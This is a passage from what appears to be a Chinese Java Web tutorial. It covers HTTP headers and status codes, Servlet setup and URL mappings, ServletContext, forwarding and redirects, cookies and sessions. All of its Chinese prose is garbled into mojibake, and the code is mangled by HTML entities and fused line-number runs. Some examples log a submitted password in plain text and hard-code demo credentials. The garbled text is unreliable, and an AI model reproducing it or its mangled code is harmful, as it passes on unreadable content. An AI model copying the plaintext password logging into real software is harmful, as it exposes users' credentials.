ISO8859-1Accept-Languageï¼šå‘Šè¯‰æµè§ˆå™¨ï¼Œå®ƒçš„è¯­è¨€ç¯å¢ƒCache-Controlï¼šç¼“å­˜æ§åˆ¶Connectionï¼šå‘Šè¯‰æµè§ˆå™¨ï¼Œè¯·æ±‚å®Œæˆæ˜¯æ–­å¼€è¿˜æ˜¯ä¿æŒè¿æ¥HOSTï¼šä¸»æœº..../.Refreshï¼šå‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå¤šä¹…åˆ·æ–°ä¸€æ¬¡ï¼›Locationï¼šè®©ç½‘é¡µé‡æ–°å®šä½ï¼› 2ã€å“åº”çŠ¶æ€ç  200ï¼šè¯·æ±‚å“åº”æˆåŠŸ 200 3xxï¼šè¯·æ±‚é‡å®šå‘ é‡å®šå‘ï¼šä½ é‡æ–°åˆ°æˆ‘ç»™ä½ æ–°ä½ç½®å»ï¼› 4xxï¼šæ‰¾ä¸åˆ°èµ„æº 404 5xxï¼šæœåŠ¡å™¨ä»£ç é”™è¯¯ 500 502:ç½‘å…³é”™è¯¯ å¸¸è§é¢è¯•é¢˜ï¼š å½“ä½ çš„æµè§ˆå™¨ä¸­åœ°å€æ è¾“å…¥åœ°å€å¹¶å›è½¦çš„ä¸€ç¬é—´åˆ°é¡µé¢èƒ½å¤Ÿå±•ç¤ºå›æ¥ï¼Œç»å†äº†ä»€ä¹ˆï¼Ÿ 0x05 Servlet ç®€ä»‹Servlet å°±æ˜¯ Sun å…¬å¸å¼€å‘åŠ¨æ€ Web çš„ä¸€é—¨æŠ€æœ¯ Sun åœ¨è¿™äº› API ï¼ˆApplication Programming Interfaceï¼Œåº”ç”¨ç¨‹åºæ¥å£ï¼‰ä¸­æä¾›ä¸€ä¸ªæ¥å£å«åšï¼šServletï¼Œå¦‚æœä½ æƒ³å¼€å‘ä¸€ä¸ªServletç¨‹åºï¼Œåªéœ€è¦å®Œæˆä¸¤ä¸ªå°æ­¥éª¤ï¼š ç¼–å†™ä¸€ä¸ªç±»ï¼Œå®ç°Servletæ¥å£ã€‚ æŠŠå¼€å‘å¥½çš„Javaç±»éƒ¨ç½²åˆ°webæœåŠ¡å™¨ä¸­ã€‚ æŠŠå®ç°äº† Servlet æ¥å£çš„ Java ç¨‹åºå«åšï¼ŒServlet,maven é…ç½® 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.she11F&lt;/groupId&gt; &lt;artifactId&gt;JavaWeb&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; 5.1 HelloServletSerlvet æ¥å£ Sun å…¬å¸æœ‰ä¸¤ä¸ªé»˜è®¤çš„å®ç°ç±»ï¼šHttpServletï¼ŒGenericServlet 5.2 ç¼–å†™ä¸€ä¸ªServletç¨‹åº ç¼–å†™ä¸€ä¸ªæ™®é€šç±» å®ç° Servlet æ¥å£ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥ç»§æ‰¿ HttpServlet 12345678910111213141516public class HelloServlet extends HttpServlet &#123; //ç”±äºgetæˆ–è€…poståªæ˜¯è¯·æ±‚å®ç°çš„ä¸åŒçš„æ–¹å¼ï¼Œå¯ä»¥ç›¸äº’è°ƒç”¨ï¼Œä¸šåŠ¡é€»è¾‘éƒ½ä¸€æ ·ï¼› @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //ServletOutputStream outputStream = resp.getOutputStream(); PrintWriter writer = resp.getWriter(); //å“åº”æµ writer.print(&quot;Hello,Serlvet&quot;); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req, resp); &#125;&#125; ç¼–å†™ Servlet çš„æ˜ å°„ ä¸ºä»€ä¹ˆéœ€è¦æ˜ å°„ï¼šæˆ‘ä»¬å†™çš„æ˜¯ Java ç¨‹åºï¼Œä½†æ˜¯è¦é€šè¿‡æµè§ˆå™¨è®¿é—®ï¼Œè€Œæµè§ˆå™¨éœ€è¦è¿æ¥ Web æœåŠ¡å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å† Web æœåŠ¡ä¸­æ³¨å†Œæˆ‘ä»¬å†™çš„ Servletï¼Œè¿˜éœ€ç»™ä»–ä¸€ä¸ªæµè§ˆå™¨èƒ½å¤Ÿè®¿é—®çš„è·¯å¾„ï¼› web.xml 12345678910&lt;!--æ³¨å†ŒServlet--&gt;&lt;servlet&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;servlet-class&gt;com.she11f.javaweb.HelloServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;!--Servletçš„è¯·æ±‚è·¯å¾„--&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 5.3 ServletåŸç†Servletæ˜¯ç”±WebæœåŠ¡å™¨è°ƒç”¨ï¼ŒwebæœåŠ¡å™¨åœ¨æ”¶åˆ°æµè§ˆå™¨è¯·æ±‚ä¹‹åï¼Œä¼šï¼š 5.4 Mapping é—®é¢˜ä¸€ä¸ª Servlet å¯ä»¥æŒ‡å®šä¸€ä¸ªæ˜ å°„è·¯å¾„ 1234&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; ä¸€ä¸ª Servlet å¯ä»¥æŒ‡å®šä¸€ä¸ªæ˜ å°„è·¯å¾„ 1234567891011121314151617181920&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello2&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello3&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello4&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello5&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; ä¸€ä¸ªServletå¯ä»¥æŒ‡å®šé€šç”¨æ˜ å°„è·¯å¾„ 1234&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; é»˜è®¤è¯·æ±‚è·¯å¾„ 12345&lt;!--é»˜è®¤è¯·æ±‚è·¯å¾„--&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; æŒ‡å®šä¸€äº›åç¼€æˆ–è€…å‰ç¼€ç­‰ç­‰â€¦. 12345678&lt;!--å¯ä»¥è‡ªå®šä¹‰åç¼€å®ç°è¯·æ±‚æ˜ å°„ æ³¨æ„ç‚¹ï¼Œ*å‰é¢ä¸èƒ½åŠ é¡¹ç›®æ˜ å°„çš„è·¯å¾„ hello/sajdlkajda.she11f --&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;*.she11f&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; ä¼˜å…ˆçº§é—®é¢˜æŒ‡å®šäº†å›ºæœ‰çš„æ˜ å°„è·¯å¾„ä¼˜å…ˆçº§æœ€é«˜ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šèµ°é»˜è®¤çš„å¤„ç†è¯·æ±‚ï¼› 123456789&lt;!--404--&gt;&lt;servlet&gt; &lt;servlet-name&gt;error&lt;/servlet-name&gt; &lt;servlet-class&gt;com.kuang.servlet.ErrorServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;error&lt;/servlet-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 5.5 ServletContextWeb å®¹å™¨åœ¨å¯åŠ¨çš„æ—¶å€™ï¼Œå®ƒä¼šä¸ºæ¯ä¸ª Web ç¨‹åºéƒ½åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ ServletContext å¯¹è±¡ï¼Œå®ƒä»£è¡¨äº†å½“å‰çš„ Web åº”ç”¨; 5.5.1å…±äº«æ•°æ®åœ¨ä¸€ä¸ª servlet ä¸­ä¿å­˜çš„æ•°æ®ï¼Œå¯ä»¥åœ¨å¦ä¸€ä¸ª servlet ä¸­æ‹¿åˆ°ï¼› 123456789101112131415public class HelloServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //this.getInitParameter() åˆå§‹åŒ–å‚æ•° //this.getServletConfig() Servleté…ç½® //this.getServletContext() Servletä¸Šä¸‹æ–‡ ServletContext context = this.getServletContext(); String username = &quot;she11f&quot;; //æ•°æ® context.setAttribute(&quot;username&quot;,username); //å°†ä¸€ä¸ªæ•°æ®ä¿å­˜åœ¨äº†ServletContextä¸­ï¼Œåå­—ä¸ºï¼šusername ã€‚å€¼ username &#125;&#125; 123456789101112131415public class GetServlet extends HttpServlet &#123; protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; ServletContext context = this.getServletContext(); String username = (String) context.getAttribute(&quot;username&quot;); resp.setContentType(&quot;text/html&quot;); resp.setCharacterEncoding(&quot;utf-8&quot;); resp.getWriter().print(&quot;åå­—&quot;+username); &#125; protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req, resp); &#125;&#125; 12345678&lt;servlet&gt; &lt;servlet-name&gt;getc&lt;/servlet-name&gt; &lt;servlet-class&gt;com.she11f.javaweb.GetServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;getc&lt;/servlet-name&gt; &lt;url-pattern&gt;/getc&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; å…ˆè®¿é—® &#x2F;hello æŠŠæ•°æ®ä¿å­˜åœ¨äº†ServletContextä¸­ï¼Œç„¶åè®¿é—® &#x2F;getcï¼Œå°±èƒ½æ‹¿åˆ°å‚æ•°äº† 5.5.2 è·å–åˆå§‹åŒ–å‚æ•°1234&lt;context-param&gt; &lt;param-name&gt;url&lt;/param-name&gt; &lt;param-value&gt;makkapakka996.github.io&lt;/param-value&gt;&lt;/context-param&gt; 123456@Overrideprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; ServletContext context = this.getServletContext(); String url = (String) context.getInitParameter(&quot;url&quot;); resp.getWriter().print(&quot;url: &quot; + url);&#125; 5.5.3 è¯·æ±‚è½¬å‘12345678910public class DispatcherTest extends HelloServlet&#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; ServletContext context = this.getServletContext(); System.out.println(&quot;è¿›å…¥äº†HelloServlet&quot;); //RequestDispatcher requestDispatcher = context.getRequestDispatcher(&quot;/gp&quot;); //è½¬å‘çš„è¯·æ±‚è·¯å¾„ //requestDispatcher.forward(req,resp); //è°ƒç”¨forwardå®ç°è¯·æ±‚è½¬å‘ï¼› context.getRequestDispatcher(&quot;/hello&quot;).forward(req,resp); &#125;&#125; 5.5.4 è¯»å–èµ„æºæ–‡ä»¶Properties åœ¨ java ç›®å½•ä¸‹æ–°å»º properties åœ¨ resources ç›®å½•ä¸‹æ–°å»º propertieså‘ç°ï¼šéƒ½è¢«æ‰“åŒ…åˆ°äº†åŒä¸€ä¸ªè·¯å¾„ä¸‹ï¼šclassesï¼Œæˆ‘ä»¬ä¿—ç§°è¿™ä¸ªè·¯å¾„ä¸ºclasspath: æ€è·¯ï¼šéœ€è¦ä¸€ä¸ªæ–‡ä»¶æµï¼› 12uername=she11fpassword=123456 123456789101112131415161718192021public class ServletDemo05 extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; InputStream is = this.getServletContext().getResourceAsStream(&quot;/WEB-INF/classes/com/kuang/servlet/aa.properties&quot;); Properties prop = new Properties(); prop.load(is); String user = prop.getProperty(&quot;username&quot;); String pwd = prop.getProperty(&quot;password&quot;); resp.getWriter().print(user+&quot;:&quot;+pwd); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req, resp); &#125;&#125; 5.6 HttpServletResponseWeb æœåŠ¡å™¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„ http è¯·æ±‚ï¼Œé’ˆå¯¹è¿™ä¸ªè¯·æ±‚ï¼Œåˆ†åˆ«åˆ›å»ºä¸€ä¸ªä»£è¡¨è¯·æ±‚çš„ HttpServletRequest å¯¹è±¡ï¼Œä»£è¡¨å“åº”çš„ä¸€ä¸ª HttpServletResponseï¼› å¦‚æœæƒ³è¦è·å–å®¢æˆ·ç«¯è¯·æ±‚è¿‡æ¥çš„å‚æ•°ï¼šæ‰¾ HttpServletRequest å¦‚æœè¦ç»™å®¢æˆ·ç«¯å“åº”ä¸€äº›ä¿¡æ¯ï¼šæ‰¾ HttpServletResponse 5.6.1 ç®€å•åˆ†ç±»è´Ÿè´£å‘æµè§ˆå™¨å‘é€æ•°æ®çš„æ–¹æ³• 12ServletOutputStream getOutputStream() throws IOException;PrintWriter getWriter() throws IOException; è´£å‘æµè§ˆå™¨å‘é€å“åº”å¤´çš„æ–¹æ³• void setCharacterEncoding(String var1); void setContentLength(int var1); void setContentLengthLong(long var1); void setContentType(String var1); void setDateHeader(String var1, long var2); void addDateHeader(String var1, long var2); void setHeader(String var1, String var2); void addHeader(String var1, String var2); void setIntHeader(String var1, int var2); void addIntHeader(String var1, int var2); å“åº”çš„çŠ¶æ€ç  1234567891011121314151617181920212223242526272829303132333435363738394041int SC_CONTINUE = 100; int SC_SWITCHING_PROTOCOLS = 101; int SC_OK = 200; int SC_CREATED = 201; int SC_ACCEPTED = 202; int SC_NON_AUTHORITATIVE_INFORMATION = 203; int SC_NO_CONTENT = 204; int SC_RESET_CONTENT = 205; int SC_PARTIAL_CONTENT = 206; int SC_MULTIPLE_CHOICES = 300; int SC_MOVED_PERMANENTLY = 301; int SC_MOVED_TEMPORARILY = 302; int SC_FOUND = 302; int SC_SEE_OTHER = 303; int SC_NOT_MODIFIED = 304; int SC_USE_PROXY = 305; int SC_TEMPORARY_REDIRECT = 307; int SC_BAD_REQUEST = 400; int SC_UNAUTHORIZED = 401; int SC_PAYMENT_REQUIRED = 402; int SC_FORBIDDEN = 403; int SC_NOT_FOUND = 404; int SC_METHOD_NOT_ALLOWED = 405; int SC_NOT_ACCEPTABLE = 406; int SC_PROXY_AUTHENTICATION_REQUIRED = 407; int SC_REQUEST_TIMEOUT = 408; int SC_CONFLICT = 409; int SC_GONE = 410; int SC_LENGTH_REQUIRED = 411; int SC_PRECONDITION_FAILED = 412; int SC_REQUEST_ENTITY_TOO_LARGE = 413; int SC_REQUEST_URI_TOO_LONG = 414; int SC_UNSUPPORTED_MEDIA_TYPE = 415; int SC_REQUESTED_RANGE_NOT_SATISFIABLE = 416; int SC_EXPECTATION_FAILED = 417; int SC_INTERNAL_SERVER_ERROR = 500; int SC_NOT_IMPLEMENTED = 501; int SC_BAD_GATEWAY = 502; int SC_SERVICE_UNAVAILABLE = 503; int SC_GATEWAY_TIMEOUT = 504; int SC_HTTP_VERSION_NOT_SUPPORTED = 505; 5.6.2 ä¸‹è½½æ–‡ä»¶ç»™æµè§ˆå™¨è¾“å‡ºæ¶ˆæ¯ ä¸‹è½½æ–‡ä»¶ 1.è¦è·å–ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ 2.ä¸‹è½½çš„æ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Ÿ 3.è®¾ç½®æµè§ˆå™¨ä½¿å…¶æ”¯æŒä¸‹è½½çš„å†…å®¹ 4.è·å–ä¸‹è½½æ–‡ä»¶çš„è¾“å…¥æµ 5.åˆ›å»ºç¼“å†²åŒº 6.è·å– OutputStream å¯¹è±¡ 7.å°† FileOutputStream å†™å…¥åˆ° bufferç¼“å†²åŒº 8.ä½¿ç”¨ OutputStream å°†ç¼“å†²åŒºä¸­çš„æ•°æ®è¾“å‡ºåˆ°å®¢æˆ·ç«¯ 5.6.3 å®ç°é‡å®šå‘Web èµ„æº B æ”¶åˆ°å®¢æˆ·ç«¯ A è¯·æ±‚åï¼Œé€šçŸ¥ A è®¿é—®å¦ä¸€ä¸ª Web èµ„æº C ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åšé‡å®šå‘ é¢è¯•é¢˜ï¼šé‡å®šå‘ä¸è½¬å‘çš„åŒºåˆ«ï¼Ÿ ç›¸åŒç‚¹ï¼š é¡µé¢éƒ½ä¼šå®ç°è·³è½¬ä¸åŒç‚¹ï¼š è¯·æ±‚è½¬å‘çš„æ—¶å€™ï¼ŒURL ä¸ä¼šå‘ç”Ÿå˜åŒ– é‡å®šå‘æ—¶å€™ï¼ŒURL åœ°å€æ ä¼šå‘ç”Ÿå˜åŒ–ï¼› ç®€å•å®ç°ç™»å½•é‡å®šå‘ 12345&lt;form action=&quot;$&#123;pageContext.request.contextPath&#125;/login&quot; method=&quot;get&quot;&gt; ç”¨æˆ·åï¼š&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt; å¯†ç ï¼š&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; 12345678910111213public class RequestTest extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //å¤„ç†è¯·æ±‚ String username = req.getParameter(&quot;username&quot;); String password = req.getParameter(&quot;password&quot;); System.out.println(username+&quot;:&quot;+password); //é‡å®šå‘æ—¶å€™ä¸€å®šè¦æ³¨æ„ï¼Œè·¯å¾„é—®é¢˜ï¼Œå¦åˆ™404ï¼› resp.sendRedirect(&quot;/JavaWeb_war/success.jsp&quot;); &#125;&#125; 12345678&lt;servlet&gt; &lt;servlet-name&gt;req&lt;/servlet-name&gt; &lt;servlet-class&gt;com.she11f.javaweb.RequestTest&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;req&lt;/servlet-name&gt; &lt;url-pattern&gt;/login&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 5.6.4 HttpServletRequest è·å–å‚æ•°ï¼Œè¯·æ±‚è½¬å‘HttpServletRequest ä»£è¡¨å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç”¨æˆ·é€šè¿‡ HTTP åè®®è®¿é—®æœåŠ¡å™¨ï¼ŒHTTP è¯·æ±‚ä¸­çš„æ‰€æœ‰ä¿¡æ¯ä¼šè¢«å°è£…åˆ° HttpServletRequest ï¼Œé€šè¿‡è¿™ä¸ªHttpServletRequest çš„æ–¹æ³•ï¼Œè·å¾—å®¢æˆ·ç«¯çš„æ‰€æœ‰ä¿¡æ¯ï¼› 12345678910111213141516171819202122@Overrideprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; req.setCharacterEncoding(&quot;utf-8&quot;); resp.setCharacterEncoding(&quot;utf-8&quot;); String username = req.getParameter(&quot;username&quot;); String password = req.getParameter(&quot;password&quot;); String[] hobbys = req.getParameterValues(&quot;hobbys&quot;); System.out.println(&quot;=============================&quot;); //åå°æ¥æ”¶ä¸­æ–‡ä¹±ç é—®é¢˜ System.out.println(username); System.out.println(password); System.out.println(Arrays.toString(hobbys)); System.out.println(&quot;=============================&quot;); System.out.println(req.getContextPath()); //é€šè¿‡è¯·æ±‚è½¬å‘ //è¿™é‡Œçš„ / ä»£è¡¨å½“å‰çš„webåº”ç”¨ req.getRequestDispatcher(&quot;/success.jsp&quot;).forward(req,resp);&#125; 0x06 Cookie Session6.1 ä¼šè¯ä¼šè¯ï¼šç”¨æˆ·æ‰“å¼€ä¸€ä¸ªæµè§ˆå™¨ï¼Œç‚¹å‡»äº†å¾ˆå¤šè¶…é“¾æ¥ï¼Œè®¿é—®å¤šä¸ª Web èµ„æºï¼Œå…³é—­æµè§ˆå™¨ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯ä»¥ç§°ä¹‹ä¸ºä¼šè¯ï¼› æœ‰çŠ¶æ€ä¼šè¯ï¼šä¸€ä¸ªåŒå­¦æ¥è¿‡æ•™å®¤ï¼Œä¸‹æ¬¡å†æ¥æ•™å®¤ï¼Œæˆ‘ä»¬ä¼šçŸ¥é“è¿™ä¸ªåŒå­¦ï¼Œæ›¾ç»æ¥è¿‡ï¼Œç§°ä¹‹ä¸ºæœ‰çŠ¶æ€ä¼šè¯ï¼› ä½ èƒ½æ€ä¹ˆè¯æ˜ä½ æ˜¯å­¦ç”Ÿï¼Ÿ ä½  å­¦æ ¡ å‘ç¥¨ å­¦æ ¡å¼€çš„å‘ç¥¨ å­¦æ ¡ç™»è®° æ ¡ç‰Œ ä½  å­¦æ ¡ å‘ç¥¨ å­¦æ ¡å¼€çš„å‘ç¥¨ å­¦æ ¡çš„ç™»è®° å­¦æ ¡ç»™ä½ çš„æ ¡ç‰Œ ä¸€ä¸ªç½‘ç«™ï¼Œæ€ä¹ˆè¯æ˜ä½ æ¥è¿‡ï¼Ÿ å®¢æˆ·ç«¯ æœåŠ¡ç«¯ å®¢æˆ·ç«¯ ï¼š æœåŠ¡ç«¯ç»™å®¢æˆ·ç«¯ä¸€ä¸ª ä¿¡ä»¶ï¼Œå®¢æˆ·ç«¯ä¸‹æ¬¡è®¿é—®æœåŠ¡ç«¯å¸¦ä¸Šä¿¡ä»¶å°±å¯ä»¥äº†ï¼› cookie æœåŠ¡ç«¯ï¼šæœåŠ¡å™¨ç™»è®°ä½ æ¥è¿‡äº†ï¼Œä¸‹æ¬¡ä½ æ¥çš„æ—¶å€™æˆ‘æ¥åŒ¹é…ä½ ï¼› seesion 6.2 ä¿å­˜ä¼šè¯çš„ä¸¤ç§æŠ€æœ¯cookie å®¢æˆ·ç«¯æŠ€æœ¯ï¼ˆå“åº”ï¼Œè¯·æ±‚ï¼‰ session æœåŠ¡å™¨æŠ€æœ¯ï¼Œåˆ©ç”¨è¿™ä¸ªæŠ€æœ¯ï¼Œå¯ä»¥ä¿å­˜ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ï¼Ÿå¯å°†ä¿¡æ¯æˆ–æ•°æ®æ”¾åœ¨ session ä¸­ 6.3 Cookie ä»è¯·æ±‚ä¸­æ‹¿åˆ° cookie ä¿¡æ¯ æœåŠ¡å™¨å“åº”ç»™å®¢æˆ·ç«¯ cookie 123456Cookie[] cookies = req.getCookies(); //è·å¾—Cookiecookie.getName(); //è·å¾—cookieä¸­çš„keycookie.getValue(); //è·å¾—cookieä¸­çš„vlauenew Cookie(&quot;lastLoginTime&quot;, System.currentTimeMillis()+&quot;&quot;); //æ–°å»ºä¸€ä¸ªcookiecookie.setMaxAge(24*60*60); //è®¾ç½®cookieçš„æœ‰æ•ˆæœŸresp.addCookie(cookie); //å“åº”ç»™å®¢æˆ·ç«¯ä¸€ä¸ªcookie cookie ï¼š ä¸€èˆ¬ä¼šä¿å­˜åœ¨æœ¬åœ°çš„ç”¨æˆ·ç›®å½•ä¸‹ appdata ï¼› ä¸€ä¸ª Web ç«™ç‚¹å¯ä»¥ç»™æµè§ˆå™¨å‘é€å¤šä¸ª Cookieï¼Œæœ€å¤šå­˜æ”¾ 20 ä¸ª cookieï¼› cookie å¤§å°æœ‰é™åˆ¶ 4kbï¼› 300 ä¸ª cookie æµè§ˆå™¨ä¸Šé™ åˆ é™¤ Cookieï¼› ä¸è®¾ç½®æœ‰æ•ˆæœŸï¼Œå…³é—­æµè§ˆå™¨ï¼Œè‡ªåŠ¨å¤±æ•ˆï¼› è®¾ç½®æœ‰æ•ˆæœŸä¸º 0ï¼› ç¼–ç è§£ç ï¼š 12URLEncoder.encode(&quot;ç§¦ç–†&quot;,&quot;utf-8&quot;)URLDecoder.decode(cookie.getValue(),&quot;UTF-8&quot;) 6.3 Sessionï¼ˆé‡ç‚¹ï¼‰ ä»€ä¹ˆæ˜¯ Session ï¼Ÿ æœåŠ¡å™¨ä¼šç»™æ¯ä¸€ä¸ªç”¨æˆ·ï¼ˆæµè§ˆå™¨ï¼‰åˆ›å»ºä¸€ä¸ª Session å¯¹è±¡ï¼› ä¸€ä¸ª Session ç‹¬å ä¸€ä¸ªæµè§ˆå™¨ï¼Œåªè¦æµè§ˆå™¨æ²¡æœ‰å…³é—­ï¼Œè¿™ä¸ª Session å°±å­˜åœ¨ï¼› ç”¨æˆ·ç™»å½•ä¹‹åï¼Œæ•´ä¸ªç½‘ç«™å®ƒéƒ½å¯ä»¥è®¿é—®ï¼&#x3D;&gt; ä¿å­˜ç”¨æˆ·çš„ä¿¡æ¯ï¼›ä¿å­˜è´­ç‰©è½¦çš„ä¿¡æ¯â€¦ Session å’Œ cookie çš„åŒºåˆ«ï¼š Cookieæ˜¯æŠŠç”¨æˆ·çš„æ•°æ®å†™ç»™ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œæµè§ˆå™¨ä¿å­˜ ï¼ˆå¯ä»¥ä¿å­˜å¤šä¸ªï¼‰ SessionæŠŠç”¨æˆ·çš„æ•°æ®å†™åˆ°ç”¨æˆ·ç‹¬å Sessionä¸­ï¼ŒæœåŠ¡å™¨ç«¯ä¿å­˜ ï¼ˆä¿å­˜é‡è¦çš„ä¿¡æ¯ï¼Œå‡å°‘æœåŠ¡å™¨èµ„æºçš„æµªè´¹ï¼‰ Session å¯¹è±¡ç”±æœåŠ¡åˆ›å»ºï¼› ä½¿ç”¨åœºæ™¯ï¼š ä¿å­˜ä¸€ä¸ªç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ï¼› è´­ç‰©è½¦ä¿¡æ¯ï¼› åœ¨æ•´ä¸ªç½‘ç«™ä¸­ç»å¸¸ä¼šä½¿ç”¨çš„æ•°æ®ï¼Œæˆ‘ä»¬å°†å®ƒä¿å­˜åœ¨ Session ä¸­ï¼› ä½¿ç”¨ Session: 12345678910111213141516171819202122232425262728293031323334public class SessionTest extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //è§£å†³ä¹±ç é—®é¢˜ req.setCharacterEncoding(&quot;UTF-8&quot;); resp.setCharacterEncoding(&quot;UTF-8&quot;); resp.setContentType(&quot;text/html;charset=utf-8&quot;); //å¾—åˆ°Session HttpSession session = req.getSession(); //ç»™Sessionä¸­å­˜ä¸œè¥¿ session.setAttribute(&quot;name&quot;,new Person(&quot;she11f&quot;,1)); //è·å–Sessionçš„ID String sessionId = session.getId(); //åˆ¤æ–­Sessionæ˜¯ä¸æ˜¯æ–°åˆ›å»º if (session.isNew())&#123; resp.getWriter().write(&quot;sessionåˆ›å»ºæˆåŠŸ,ID:&quot;+sessionId); &#125;else &#123; resp.getWriter().write(&quot;sessionä»¥åŠåœ¨æœåŠ¡å™¨ä¸­å­˜åœ¨äº†,ID:&quot;+sessionId); &#125; //Sessionåˆ›å»ºçš„æ—¶å€™åšäº†ä»€ä¹ˆäº‹æƒ…ï¼›// Cookie cookie = new Cookie(&quot;JSESSIONID&quot;,sessionId);// resp.addCookie(cookie); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req, resp); &#125;&#125; 12345678910111213141516public class SessionTest01 extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; //å¾—åˆ°Session HttpSession session = req.getSession(); Person person = (Person) session.getAttribute(&quot;name&quot;); System.out.println(person.toString()); &#125; @Override protected void 